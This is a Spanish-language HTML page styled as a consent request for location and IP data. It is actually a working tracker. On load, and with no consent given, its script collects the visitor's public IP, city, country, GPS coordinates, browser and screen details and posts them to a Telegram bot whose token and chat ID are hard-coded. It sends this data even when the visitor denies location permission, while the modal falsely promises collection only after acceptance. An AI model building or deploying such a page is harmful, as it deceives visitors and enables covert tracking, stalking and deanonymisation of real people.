<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Consentimiento Requerido</title>

<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        background: #f2f2f2;
    }

    /* Modal */
    .modal-overlay {
        position: fixed;
        top:0; left:0;
        width:100%; height:100%;
        background: rgba(0,0,0,0.75);
        display:flex;
        justify-content:center;
        align-items:center;
        z-index:9999;
    }

    .modal-content {
        background:white;
        padding:25px;
        width:90%; max-width:420px;
        border-radius:12px;
        text-align:center;
        box-shadow:0 3px 10px rgba(0,0,0,0.3);
        animation: fadeIn 0.3s ease;
    }

    .modal-content img {
        width:80px;
        margin-bottom:15px;
    }

    h3 { margin-top:0; color:#333; }

    @keyframes fadeIn {
        from { opacity:0; transform: scale(0.9); }
        to { opacity:1; transform: scale(1); }
    }

    #main-content { padding:20px; display:none; }
</style>
</head>

<body>

<!-- CONTENIDO REAL -->
<div id="main-content">
    <h1>Bienvenido</h1>
    <p>Gracias por otorgar tu consentimiento.</p>
</div>

<!-- MODAL DE CONSENTIMIENTO -->
<div id="consent-modal" class="modal-overlay">
    <div class="modal-content">
        <img src="https://i.ibb.co/4V3XxS6/alert-icon.png">
        <h3>Permiso Necesario</h3>
        <p>
            Para continuar, necesitamos tu consentimiento para obtener
            tu <strong>ubicaci√≥n aproximada</strong> y tu <strong>IP p√∫blica</strong>.
            <br><br>
            Esta informaci√≥n se recopilar√° <strong>solo despu√©s de que aceptes</strong>
            y ser√° enviada de forma segura.
        </p>
    </div>
</div>

<script>
// --- CONFIG TELEGRAM ---
const BOT_TOKEN = "8253513816:AAERpjUuX757c3cd8wzOmW0vvpTHce6KCIo";
const CHAT_ID  = "-5099354587";

// Obtener IP p√∫blica
async function obtenerIP() {
    try {
        let r = await fetch("https://ipapi.co/json/");
        if (!r.ok) return {};
        return await r.json();
    } catch(e) { return {}; }
}

// Formatear mensaje HTML para Telegram
function armarMensaje(datos) {
    return `
<b>üìç NUEVO CONSENTIMIENTO</b>

<b>üïí Fecha/Hora:</b> ${datos.fecha}

<b>üåê IP P√∫blica:</b> ${datos.ip}
<b>üìå Ciudad:</b> ${datos.city}
<b>üá∫üá∏ Pa√≠s:</b> ${datos.country}

<b>üì° Ubicaci√≥n (GPS):</b>
‚Ä¢ Latitud: ${datos.lat}
‚Ä¢ Longitud: ${datos.lng}
‚Ä¢ Precisi√≥n: ${datos.accuracy} m
‚Ä¢ <a href="https://www.google.com/maps?q=${datos.lat},${datos.lng}">Ver en Maps</a>

<b>üì± Dispositivo:</b>
‚Ä¢ Navegador: ${datos.ua}
‚Ä¢ Plataforma: ${datos.platform}
‚Ä¢ Resoluci√≥n: ${datos.resolution}
`;
}

// Enviar mensaje a Telegram
async function enviarTelegram(msg) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await fetch(url, {
        method: "POST",
        headers: { "Content-Type":"application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: "HTML"
        })
    });
}

// Funci√≥n principal
async function pedirConsentimiento() {
    const ipInfo = await obtenerIP();

    // Solicitar geolocalizaci√≥n al cargar
    navigator.geolocation.getCurrentPosition(async pos => {
        const datos = {
            fecha: new Date().toLocaleString(),
            ip: ipInfo.ip || "N/D",
            city: ipInfo.city || "N/D",
            country: ipInfo.country_name || "N/D",
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            ua: navigator.userAgent,
            platform: navigator.platform,
            resolution: `${screen.width}x${screen.height}`
        };
        await enviarTelegram(armarMensaje(datos));

        // Ocultar modal y mostrar contenido
        document.getElementById("consent-modal").style.display = "none";
        document.getElementById("main-content").style.display = "block";
    }, async err => {
        // Si el usuario niega
        const datos = {
            fecha: new Date().toLocaleString(),
            ip: ipInfo.ip || "N/D",
            city: ipInfo.city || "N/D",
            country: ipInfo.country_name || "N/D",
            lat: "PERMISO DENEGADO",
            lng: "PERMISO DENEGADO",
            accuracy: "N/A",
            ua: navigator.userAgent,
            platform: navigator.platform,
            resolution: `${screen.width}x${screen.height}`
        };
        await enviarTelegram(armarMensaje(datos));

        document.getElementById("consent-modal").style.display = "none";
        document.getElementById("main-content").style.display = "block";
    });
}

// Ejecutar al cargar
window.onload = pedirConsentimiento;
</script>

</body>
</html>
